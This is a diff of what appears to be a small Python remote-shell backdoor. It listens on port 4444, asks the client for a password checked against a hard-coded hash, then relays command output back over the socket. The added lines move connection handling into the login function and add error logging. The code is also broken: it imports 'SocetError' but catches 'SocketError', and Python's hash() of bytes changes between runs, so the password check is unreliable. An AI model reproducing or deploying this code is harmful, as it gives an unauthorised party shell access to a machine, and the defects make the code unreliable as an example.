@@ -1,4 +1,5 @@
 import socket
+from socket import error as SocetError
 import subprocess
 
 HOST = ''
@@ -7,24 +8,32 @@ PORT = 4444
 server = socket.socket()
 server.bind((HOST, PORT))
 
-def login():
+
+def login():    
+    server.listen(1)
+    global client, client_addr
+    client, client_addr = server.accept()
+    print('Connection established, login attempt')
     while True:
-            try:
+            try:                
                 password = client.recv(1024)
                 password.decode()
                 print(password)
                 if hash(password) == 1634504265594755506:
                         print('Login Success')
                         break
-            except Exception as e:
+                else:
+                    print('Failed Login')
+            except SocketError as se:
+                print('SocketError', se)                
                 server.listen(1)
                 client, client_addr = server.accept()
+            except Exception as e:
+                print('Exception', e)
+                pass
 
 print('Server Started')
 print('Listening for Client Connection...')
-
-server.listen(1)
-client, client_addr = server.accept()
 
 login()
 
@@ -48,6 +57,7 @@ while True:
             	else:
                     	client.send(output + output_error)
     	except Exception as e:
+                print('Main Loop Exception', e)
                 login()
 
 server.close()
